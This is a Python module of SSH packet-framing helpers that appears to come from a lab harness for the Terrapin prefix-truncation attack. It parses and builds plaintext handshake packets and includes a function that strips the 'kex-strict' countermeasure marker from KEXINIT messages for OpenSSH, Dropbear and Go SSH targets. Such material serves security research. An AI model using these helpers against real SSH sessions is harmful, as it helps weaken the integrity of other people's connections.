#!/usr/bin/env python3
"""
SSH Binary Packet Protocol (BPP) framing helpers, ported from
terrapin-harness-submission:terrapin-harness/relay/ssh_wire.py and extended
for the bounded-contribution plan (see ATTACK_README.md, item 2: full
prefix truncation).

Frame layout (RFC 4253 s6):
    uint32    packet_length   (length of everything below, bytes)
    byte      padding_length
    byte[n1]  payload         (n1 = packet_length - padding_length - 1)
    byte[n2]  random padding  (n2 = padding_length)

During the unencrypted phase the "cipher block size" is treated as 8
bytes per spec, and padding_length must be >= 4.

Everything in this module operates on the PLAINTEXT handshake only
(banner exchange through NEWKEYS). It is implementation-agnostic: any
RFC 4253-compliant peer -- OpenSSH, Dropbear, Gitea's golang.org/x/crypto/ssh,
or the lab's russh app -- frames this phase identically, which is what lets
"Breadth" (roadmap item 1) reuse this module unchanged against all four.
"""

from __future__ import annotations

import secrets
import socket
import struct
from dataclasses import dataclass

BLOCK_SIZE = 8
MIN_PADDING = 4

# SSH message numbers we care about (RFC 4253 / RFC 4250).
SSH_MSG_IGNORE = 2
SSH_MSG_UNIMPLEMENTED = 3
SSH_MSG_DEBUG = 4
SSH_MSG_KEXINIT = 20
SSH_MSG_NEWKEYS = 21

MSG_NAMES = {
    SSH_MSG_IGNORE: "SSH_MSG_IGNORE",
    SSH_MSG_UNIMPLEMENTED: "SSH_MSG_UNIMPLEMENTED",
    SSH_MSG_DEBUG: "SSH_MSG_DEBUG",
    SSH_MSG_KEXINIT: "SSH_MSG_KEXINIT",
    SSH_MSG_NEWKEYS: "SSH_MSG_NEWKEYS",
}

# KEXINIT name-list order, RFC 4253 s7.1. Index into parse_kexinit_namelists().
KEXINIT_FIELDS = [
    "kex_algorithms",
    "server_host_key_algorithms",
    "encryption_algorithms_client_to_server",
    "encryption_algorithms_server_to_client",
    "mac_algorithms_client_to_server",
    "mac_algorithms_server_to_client",
    "compression_algorithms_client_to_server",
    "compression_algorithms_server_to_client",
    "languages_client_to_server",
    "languages_server_to_client",
]


def msg_name(msg_type: int) -> str:
    return MSG_NAMES.get(msg_type, f"UNKNOWN({msg_type})")


class ConnectionClosed(Exception):
    """Raised when a peer closes the TCP connection mid-read."""


def recv_exact(sock: socket.socket, n: int) -> bytes:
    """Read exactly n bytes or raise ConnectionClosed."""
    chunks = []
    remaining = n
    while remaining > 0:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ConnectionClosed(f"peer closed while reading {n} bytes")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def recv_version_banner(sock: socket.socket) -> bytes:
    """Read the SSH identification string, terminated by CRLF (RFC 4253 s4.2)."""
    buf = bytearray()
    while not buf.endswith(b"\r\n"):
        byte = sock.recv(1)
        if not byte:
            raise ConnectionClosed("peer closed during version banner")
        buf += byte
        if len(buf) > 1024:
            raise ValueError("version banner exceeded 1024 bytes, aborting")
    return bytes(buf)


@dataclass
class PlainPacket:
    raw: bytes          # full frame, including the 4-byte length prefix
    msg_type: int
    payload: bytes       # payload INCLUDING the leading msg_type byte


def recv_plain_packet(sock: socket.socket) -> PlainPacket:
    """Read one unencrypted BPP frame from sock."""
    length_bytes = recv_exact(sock, 4)
    (packet_length,) = struct.unpack(">I", length_bytes)
    rest = recv_exact(sock, packet_length)
    padding_length = rest[0]
    payload = rest[1 : packet_length - padding_length]
    raw = length_bytes + rest
    msg_type = payload[0] if payload else -1
    return PlainPacket(raw=raw, msg_type=msg_type, payload=payload)


def build_plain_packet_from_payload(payload: bytes) -> bytes:
    """Frame an arbitrary payload (msg_type + body) as a plaintext BPP packet.

    RFC 4253 s6: the length of the concatenation of packet_length (4
    bytes), padding_length (1 byte), payload, and random padding MUST be
    a multiple of the cipher block size or 8, whichever is larger -- i.e.
    the 4-byte length field itself is included in the alignment
    requirement, not just the bytes after it.
    """
    LENGTH_FIELD_SIZE = 4
    for padding_length in range(MIN_PADDING, MIN_PADDING + BLOCK_SIZE):
        total = LENGTH_FIELD_SIZE + 1 + len(payload) + padding_length
        if total % BLOCK_SIZE == 0:
            break
    padding = secrets.token_bytes(padding_length)
    packet_length = 1 + len(payload) + padding_length
    return struct.pack(">I", packet_length) + bytes([padding_length]) + payload + padding


def build_plain_packet(msg_type: int, body: bytes = b"") -> bytes:
    return build_plain_packet_from_payload(bytes([msg_type]) + body)


def build_ignore_packet(data: bytes = b"") -> bytes:
    """SSH_MSG_IGNORE: byte type, uint32 length, byte[length] data (RFC 4253 s11.2)."""
    body = struct.pack(">I", len(data)) + data
    return build_plain_packet(SSH_MSG_IGNORE, body)


# ---------------------------------------------------------------------------
# KEXINIT strict-kex marker handling (unchanged from the harness branch).
# ---------------------------------------------------------------------------

STRICT_KEX_PREFIX = "kex-strict-"


def strip_strict_kex_marker(payload: bytes) -> bytes:
    """Return a copy of a KEXINIT payload with any kex-strict-* token removed."""
    assert payload[0] == SSH_MSG_KEXINIT, "not a KEXINIT payload"
    offset = 1 + 16  # msg_type + 16-byte cookie
    (list_len,) = struct.unpack_from(">I", payload, offset)
    list_start = offset + 4
    list_end = list_start + list_len
    name_list = payload[list_start:list_end].decode("ascii") if list_len else ""
    names = [n for n in name_list.split(",") if n]
    filtered = [n for n in names if not n.startswith(STRICT_KEX_PREFIX)]
    new_list = ",".join(filtered).encode("ascii")
    return (
        payload[:offset]
        + struct.pack(">I", len(new_list))
        + new_list
        + payload[list_end:]
    )


def has_strict_kex_marker(payload: bytes) -> bool:
    assert payload[0] == SSH_MSG_KEXINIT, "not a KEXINIT payload"
    offset = 1 + 16
    (list_len,) = struct.unpack_from(">I", payload, offset)
    list_start = offset + 4
    list_end = list_start + list_len
    name_list = payload[list_start:list_end].decode("ascii") if list_len else ""
    return any(n.startswith(STRICT_KEX_PREFIX) for n in name_list.split(","))


# ---------------------------------------------------------------------------
# NEW for the bounded-contribution plan: parsing all ten KEXINIT name-lists,
# needed to work out which cipher governs the server->client ciphertext
# stream so item 2 (full prefix truncation) knows which truncation profile
# to look up. Read-only: does not mutate the KEXINIT payload.
# ---------------------------------------------------------------------------


def parse_kexinit_namelists(payload: bytes) -> dict[str, list[str]]:
    """Return all 10 RFC 4253 s7.1 name-lists from a KEXINIT payload, by field name."""
    assert payload[0] == SSH_MSG_KEXINIT, "not a KEXINIT payload"
    offset = 1 + 16  # msg_type + 16-byte cookie
    result: dict[str, list[str]] = {}
    for field in KEXINIT_FIELDS:
        (list_len,) = struct.unpack_from(">I", payload, offset)
        start = offset + 4
        end = start + list_len
        raw = payload[start:end].decode("ascii") if list_len else ""
        result[field] = [n for n in raw.split(",") if n]
        offset = end
    return result


def negotiate_algorithm(client_prefs: list[str], server_supported: list[str]) -> str | None:
    """RFC 4253 s7.1: first of the client's preferences also in the server's list."""
    server_set = set(server_supported)
    for name in client_prefs:
        if name in server_set:
            return name
    return None


def negotiated_server_to_client_cipher(
    client_kexinit_payload: bytes, server_kexinit_payload: bytes
) -> str | None:
    """The cipher that will actually encrypt server->client traffic post-NEWKEYS."""
    client_lists = parse_kexinit_namelists(client_kexinit_payload)
    server_lists = parse_kexinit_namelists(server_kexinit_payload)
    return negotiate_algorithm(
        client_lists["encryption_algorithms_server_to_client"],
        server_lists["encryption_algorithms_server_to_client"],
    )


def negotiated_server_to_client_mac(
    client_kexinit_payload: bytes, server_kexinit_payload: bytes
) -> str | None:
    """The MAC that will authenticate server->client traffic post-NEWKEYS.

    Irrelevant (and typically empty-string-negotiated-away) for an AEAD
    cipher (*-gcm@openssh.com), which carries its own authentication tag
    instead of a separate MAC -- callers should check the cipher first.
    """
    client_lists = parse_kexinit_namelists(client_kexinit_payload)
    server_lists = parse_kexinit_namelists(server_kexinit_payload)
    return negotiate_algorithm(
        client_lists["mac_algorithms_server_to_client"],
        server_lists["mac_algorithms_server_to_client"],
    )
